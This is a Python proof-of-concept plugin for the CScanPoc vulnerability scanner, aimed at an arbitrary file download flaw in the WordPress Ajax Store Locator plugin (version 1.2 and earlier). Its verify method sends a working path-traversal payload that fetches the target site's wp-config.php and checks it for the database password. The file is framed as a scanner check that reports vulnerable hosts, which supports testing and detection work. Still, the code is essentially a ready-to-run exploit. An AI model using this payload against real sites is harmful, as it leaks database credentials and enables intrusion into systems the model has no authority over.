# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'WordPress_0053' # 平台漏洞编号，留空
    name = 'WordPress Plugin Ajax Store Locator 1.2 任意文件'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-12-08'  # 漏洞公布时间
    desc = '''
        WordPress Ajax Store Locator <= 1.2 Arbitrary File Download.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/35493/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Wordpress Ajax Store Locator <= 1.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '4902b1da-ab3c-4b06-bbfc-0aa640a427eb'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and 'DB_PASSWORD' in r.content:
                #security_hole(verify_url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
